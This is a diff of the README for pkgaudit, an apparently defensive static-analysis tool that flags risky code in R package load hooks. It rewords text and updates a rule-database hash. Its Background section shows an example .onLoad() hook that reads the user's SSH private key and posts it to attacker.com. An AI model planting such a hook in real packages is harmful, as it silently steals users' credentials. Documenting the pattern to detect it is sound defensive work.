@@ -2,22 +2,27 @@
 
 [![R-CMD-check](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml)
 
-pkgaudit provides static analysis security testing (SAST) for R packages. It searches R source code for possibly malicious patterns and, if found, returns the results with a clear explanation of the pattern and its relationship to the [MITRE ATT&CK](https://attack.mitre.org/) framework of adversary tactics and techniques.
+pkgaudit provides static analysis security testing (SAST) for R packages. It searches R source code for security-relevant patterns warranting manual review and, if found, returns the results with a clear explanation of the pattern and its relationship to the [MITRE ATT&CK](https://attack.mitre.org/) framework of adversary tactics and techniques.
 
 ## Background
 
 R is a statistical programming language widely used in environments processing sensitive data: clinical trial analyses, government statistics, financial risk modeling, academic research, and more. 
 
-R packages are the primary mechanism for sharing R code. They are also potential attack vectors. When a user calls `install.packages()` or `library()`, for example, R automatically executes any code in hooks like `.onLoad()` and `.onAttach()`. A malicious or compromised package can run arbitrary code on the user's system without any action beyond the normal R workflow.
+R packages are the primary mechanism for sharing R code. They are also potential attack vectors. When a user calls `install.packages()` or `library()`, for example, R automatically executes code in hooks like `.onLoad()` and `.onAttach()`. A malicious or compromised package can run arbitrary code on the user's system without any action beyond the normal R workflow.
 
 A minimal example of what a malicious `.onLoad()` hook might look like is:
 
 ``` r
 .onLoad <- function(libname, pkgname) {
   tryCatch({
-    key <- readLines("~/.ssh/id_rsa")
-    httr::POST("https://attacker.com/collect",
-               body = list(key = paste(key, collapse = "\n")))
+    key <- paste(
+      readLines("~/.ssh/id_rsa"), 
+      collapse = "\n"
+    )
+    httr::POST(
+      "https://attacker.com/collect",
+      body = list(key = key)
+    )
   }, error = function(e) invisible(NULL))
 }
 ```
@@ -26,15 +31,13 @@ This code reads the user's SSH private key and sends it to an external server wh
 
 This is not a theoretical risk. The same attack pattern has been documented repeatedly in ecosystems adjacent to R. In 2022, the Python package ctx on PyPI was compromised to exfiltrate environment variables — including cloud credentials — from data scientists' systems. In 2024, the Python package ultralytics, a widely used computer vision library, was compromised to distribute a cryptominer to its users.
 
+R's use in environments handling sensitive data makes it an attractive target for a broad range of threat actors. The assets at risk include both the data processed in R sessions and the underlying systems on which R runs, which provide compute resources and credentials for lateral movement.
+
 pkgaudit aims to provide one layer of defense against an underappreciated risk. A pkgaudit finding does not necessarily indicate malicious code, but prospective users should review flagged code prior to running it.
-
-## Threat Model
-
-R's use in environments handling sensitive data makes it an attractive target for a broad range of threat actors. The assets at risk include both the data processed in R sessions and the underlying systems on which R runs, which provide compute resources and credentials for lateral movement. pkgaudit currently focuses on lifecycle hooks (`.onLoad()`, `.onAttach()`) as the primary attack surface because code in these hooks executes automatically when a package is loaded.
 
 ## Rule Coverage
 
-All rules in v0.2.0 target calls inside `.onLoad()` or `.onAttach()` hooks. Calls to the same functions outside these hooks are not flagged.
+All rules in v0.2.0 target calls inside `.onLoad()` or `.onAttach()` hooks because code in these hooks executes automatically when a user calls `library()`. Calls to the same functions outside these hooks are not flagged.
 
 | Category | Rule | Pattern |
 |---|---|---|
@@ -69,7 +72,7 @@ digest::digest(
   file = TRUE
 )
 ```
-Expected SHA-256: `43d937510e3879908b5698d267702f58d8e64f5b91254ca7e855702f54a1edcd`
+Expected SHA-256: `42f7fdf3dfcbab21739f3649a8011921456ecfea64a63efe9b238c9dde1abdf8`
 
 The hash is regenerated automatically by `inst/scripts/build_rules.R` whenever the database is rebuilt and should match the value above exactly.
 
